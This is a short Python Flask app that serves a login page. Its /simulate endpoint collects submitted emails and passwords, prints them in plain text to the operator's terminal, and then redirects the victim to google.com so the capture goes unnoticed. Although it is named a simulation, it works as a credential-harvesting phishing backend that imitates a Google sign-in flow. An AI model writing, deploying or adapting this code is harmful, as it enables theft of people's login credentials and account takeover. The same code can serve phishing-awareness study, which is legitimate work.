from datetime import datetime
import os
import sys

def create_app():
    """Builds the Flask application with open terminal logging and redirects."""
    from flask import Flask, render_template, request, jsonify, redirect

    base_dir = os.path.dirname(os.path.abspath(__file__))
    app = Flask(__name__, template_folder=os.path.join(base_dir, "templates"))

    @app.get("/")
    def home():
        return render_template("index.html")

    @app.post("/simulate")
    def simulate():
        if request.is_json:
            data = request.get_json(silent=True) or {}
            email = str(data.get("email", "")).strip()
            password = str(data.get("password", ""))
        else:
            email = str(request.form.get("email", "")).strip()
            password = str(request.form.get("password", ""))

        if not email or not password:
            return jsonify(ok=False, message="Fields missing."), 400

        # Log the metrics transparently to your local terminal console screen
        timestamp = datetime.now().astimezone().strftime("%Y-%m-%d %H:%M:%S %Z")
        print(f"\n[{timestamp}] --- INCOMING DATA LOGGED ---")
        print(f"Received Email:    {email}")
        print(f"Received Password: {password}")
        print("-" * 40)

        # Seamless redirect line to the actual Google login portal
        return redirect("https://google.com")
        
    return app


def start_server():
    """Entry point for your global terminal shortcut command."""
    base_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(base_dir)

    venv_site_packages = os.path.join(base_dir, ".venv", "lib", "python3.14", "site-packages")
    if os.path.exists(venv_site_packages):
        sys.path.insert(0, venv_site_packages)
    
    app_instance = create_app()
    print("Launching Flask Web Server...")
    app_instance.run(host="127.0.0.1", port=5000, debug=False)

if __name__ == "__main__":
    start_server()
